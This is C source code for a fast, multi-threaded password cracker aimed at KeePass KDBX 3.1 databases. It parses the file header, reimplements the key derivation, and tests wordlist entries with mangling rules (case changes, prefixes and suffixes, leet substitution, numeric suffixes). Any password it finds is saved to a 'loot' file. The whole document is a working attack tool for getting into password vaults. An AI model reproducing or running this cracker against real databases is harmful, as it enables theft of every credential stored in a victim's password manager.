/*
 * kdbx_crack.c - fast multi-threaded KDBX 3.1 (AES-256, SHA-256 KDF) password cracker
 *
 * KDF (KeePass KDBX3):
 *   comp   = SHA256(SHA256(pw))
 *   trans  = AES-256-ECB(transformSeed)^rounds (comp)
 *   master = SHA256(masterSeed || trans)
 * Verify: AES-256-ECB-decrypt(first payload block) XOR IV == StreamStartBytes[0..15]
 * (equivalent to AES-CBC first block check)
 *
 * Build: gcc -O2 -march=native -pthread -DOPENSSL_API_COMPAT=0x10100000L \
 *        -o kdbx_crack kdbx_crack.c -lcrypto
 */
#define OPENSSL_API_COMPAT 0x10100000L
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <stdint.h>
#include <ctype.h>
#include <openssl/aes.h>
#include <openssl/sha.h>

static uint8_t masterSeed[32], transformSeed[32], iv[16], startBytes[16], payBlock[16];
static uint64_t rounds = 1;
static AES_KEY tkey_enc;

static volatile int found = 0;
static char foundPw[256];

typedef struct { char *data; uint32_t *off; size_t n; } WordList;

static WordList W;
static size_t nextIdx = 0;
static size_t CHUNK = 512;
static pthread_mutex_t outmtx = PTHREAD_MUTEX_INITIALIZER;
static volatile uint64_t counter = 0;
static const char *MODE = "mangle";   /* mangle | mangle2 | plain */

/* ---------- wordlist ---------- */
static int load_words(const char *path) {
    FILE *f = fopen(path, "rb");
    if (!f) { perror(path); return -1; }
    fseek(f, 0, SEEK_END);
    size_t sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    char *buf = malloc(sz + 1);
    if (!buf) return -1;
    if (fread(buf, 1, sz, f) != sz) { fclose(f); return -1; }
    fclose(f);
    buf[sz] = 0;
    size_t cap = 1 << 20;
    uint32_t *off = malloc(cap * sizeof(uint32_t));
    size_t n = 0, start = 0;
    for (size_t i = 0; i <= sz; i++) {
        if (i == sz || buf[i] == '\n' || buf[i] == '\r') {
            if (i > start) {
                if (n == cap) { cap <<= 1; off = realloc(off, cap * sizeof(uint32_t)); }
                off[n++] = (uint32_t)start;
                buf[i] = 0;
            }
            start = i + 1;
        }
    }
    W.data = buf; W.off = off; W.n = n;
    return 0;
}

/* ---------- header parsing ---------- */
static int parse_header(const char *path) {
    FILE *f = fopen(path, "rb");
    if (!f) { perror(path); return -1; }
    uint8_t *d = malloc(1 << 20);
    size_t n = fread(d, 1, 1 << 20, f);
    fclose(f);
    uint32_t sig1, sig2, ver;
    memcpy(&sig1, d, 4); memcpy(&sig2, d + 4, 4); memcpy(&ver, d + 8, 4);
    if (sig1 != 0x9AA2D903u || sig2 != 0xB54BFB67u) { fprintf(stderr, "not kdbx\n"); return -1; }
    size_t off = 12;
    while (off + 3 <= n) {
        uint8_t t = d[off];
        uint16_t len;
        memcpy(&len, d + off + 1, 2);
        off += 3;
        const uint8_t *v = d + off;
        switch (t) {
            case 0: goto done;
            case 4: memcpy(masterSeed, v, 32); break;
            case 5: memcpy(transformSeed, v, 32); break;
            case 6: memcpy(&rounds, v, 8); break;
            case 7: memcpy(iv, v, 16); break;
            case 9: memcpy(startBytes, v, 16); break;   /* first 16 of StreamStartBytes */
        }
        off += len;
    }
done:
    if (off + 16 > n) { fprintf(stderr, "short payload\n"); return -1; }
    memcpy(payBlock, d + off, 16);
    free(d);
    return 0;
}

/* ---------- crypto check ---------- */
static inline int check_pw(const char *pw) {
    uint8_t h1[32], comp[32], mk[32], out[32];
    SHA256((const uint8_t *)pw, strlen(pw), h1);
    SHA256(h1, 32, comp);
    uint64_t r = rounds ? rounds : 1;
    for (uint64_t i = 0; i < r; i++) {
        uint8_t a[16], b[16];
        memcpy(a, comp, 16); memcpy(b, comp + 16, 16);
        AES_encrypt(a, comp, &tkey_enc);
        AES_encrypt(b, comp + 16, &tkey_enc);
    }
    SHA256_CTX c;
    SHA256_Init(&c);
    SHA256_Update(&c, masterSeed, 32);
    SHA256_Update(&c, comp, 32);
    SHA256_Final(mk, &c);

    AES_KEY dk;
    AES_set_decrypt_key(mk, 256, &dk);
    AES_decrypt(payBlock, out, &dk);
    for (int i = 0; i < 16; i++)
        if ((out[i] ^ iv[i]) != startBytes[i]) return 0;
    return 1;
}

/* ---------- mangling ---------- */
static const char *SUF[] = {"", "1", "12", "123", "1234", "12345", "123456", "!",
                            "1!", "!1", "01", "007", "2020", "2021", "2022", "2023",
                            "2024", "2025", "2026", "@", "#", "@123", "123!", "!!"};
static const int NSUF = sizeof(SUF) / sizeof(*SUF);
static const char *PRE[] = {"", "!", "@", "123", "1", "#"};
static const int NPRE = sizeof(PRE) / sizeof(*PRE);

typedef struct { char buf[128]; } Mangle;

static void case_variants(const char *w, char out[5][128]) {
    size_t n = strlen(w);
    if (n > 100) n = 100;
    /* 0 none, 1 lower, 2 upper, 3 capitalize, 4 title */
    memcpy(out[0], w, n); out[0][n] = 0;
    for (size_t i = 0; i < n; i++) {
        out[1][i] = tolower((unsigned char)w[i]);
        out[2][i] = toupper((unsigned char)w[i]);
        out[3][i] = (i == 0) ? toupper((unsigned char)w[i]) : tolower((unsigned char)w[i]);
        out[4][i] = (i == 0 || w[i - 1] == ' ' || w[i - 1] == '-') ?
                    toupper((unsigned char)w[i]) : tolower((unsigned char)w[i]);
    }
    for (int k = 1; k < 5; k++) out[k][n] = 0;
}

static int leet_basic(const char *in, char *out) {
    int changed = 0;
    size_t j = 0;
    for (size_t i = 0; in[i]; i++) {
        char c = in[i];
        switch (tolower((unsigned char)c)) {
            case 'a': out[j++] = '@'; changed = 1; break;
            case 'e': out[j++] = '3'; changed = 1; break;
            case 'i': out[j++] = '1'; changed = 1; break;
            case 'o': out[j++] = '0'; changed = 1; break;
            case 's': out[j++] = '$'; changed = 1; break;
            default: out[j++] = c;
        }
    }
    out[j] = 0;
    return changed;
}

static void *worker(void *arg) {
    (void)arg;
    char cv[5][128], cand[256], rev[128];
    Mangle m;
    while (!found) {
        size_t base = __sync_fetch_and_add(&nextIdx, CHUNK);
        if (base >= W.n) break;
        size_t end = base + CHUNK; if (end > W.n) end = W.n;
        for (size_t i = base; i < end && !found; i++) {
            const char *w = W.data + W.off[i];
            if (check_pw(w)) { strcpy(foundPw, w); found = 1; break; }
            case_variants(w, cv);
            if (!strcmp(MODE, "plain")) { __sync_fetch_and_add(&counter, 1); continue; }
            for (int c = 0; c < 5 && !found; c++) {
                /* suffixes */
                for (int s = 0; s < NSUF && !found; s++) {
                    snprintf(cand, sizeof cand, "%s%s", cv[c], SUF[s]);
                    if (check_pw(cand)) { strcpy(foundPw, cand); found = 1; break; }
                }
                if (found) break;
                /* prefixes */
                for (int p = 1; p < NPRE && !found; p++) {
                    snprintf(cand, sizeof cand, "%s%s", PRE[p], cv[c]);
                    if (check_pw(cand)) { strcpy(foundPw, cand); found = 1; break; }
                }
            }
            if (found) break;
            /* reverse, reverse+case */
            size_t n = strlen(w);
            if (n < 100) {
                for (size_t k = 0; k < n; k++) rev[k] = w[n - 1 - k];
                rev[n] = 0;
                if (check_pw(rev)) { strcpy(foundPw, rev); found = 1; break; }
                for (int s = 0; s < NSUF && !found; s++) {
                    snprintf(cand, sizeof cand, "%s%s", rev, SUF[s]);
                    if (check_pw(cand)) { strcpy(foundPw, cand); found = 1; break; }
                }
            }
            if (found) break;
            if (!strcmp(MODE, "mangle2")) {
                if (leet_basic(cv[1], m.buf) && check_pw(m.buf)) { strcpy(foundPw, m.buf); found = 1; break; }
                if (leet_basic(cv[3], m.buf) && check_pw(m.buf)) { strcpy(foundPw, m.buf); found = 1; break; }
                /* all 0-9999 numeric suffixes on lower/capitalized forms */
                for (int num = 0; num < 10000 && !found; num++) {
                    snprintf(cand, sizeof cand, "%s%d", cv[1], num);
                    if (check_pw(cand)) { strcpy(foundPw, cand); found = 1; break; }
                    snprintf(cand, sizeof cand, "%s%d", cv[3], num);
                    if (check_pw(cand)) { strcpy(foundPw, cand); found = 1; break; }
                }
            }
            __sync_fetch_and_add(&counter, 1);
        }
    }
    return NULL;
}

int main(int argc, char **argv) {
    if (argc < 3) { fprintf(stderr, "usage: %s <kdbx> <wordlist> [plain|mangle|mangle2]\n", argv[0]); return 2; }
    if (argc > 3) MODE = argv[3];
    if (parse_header(argv[1]) < 0) return 1;
    if (load_words(argv[2]) < 0) return 1;
    AES_set_encrypt_key(transformSeed, 256, &tkey_enc);
    int nthreads = 12;
    const char *e = getenv("THREADS");
    if (e) nthreads = atoi(e);
    fprintf(stderr, "words=%zu rounds=%lu threads=%d mode=%s\n", W.n, (unsigned long)rounds, nthreads, MODE);

    pthread_t th[64];
    if (nthreads > 64) nthreads = 64;
    for (int i = 0; i < nthreads; i++) pthread_create(&th[i], NULL, worker, NULL);
    for (int i = 0; i < nthreads; i++) pthread_join(th[i], NULL);

    if (found) {
        printf("FOUND:%s\n", foundPw);
        FILE *o = fopen("loot/kdbx_master_password.txt", "w");
        if (o) { fprintf(o, "%s\n", foundPw); fclose(o); }
        return 0;
    }
    printf("not found (words=%zu, counters=%lu)\n", W.n, (unsigned long)counter);
    return 1;
}
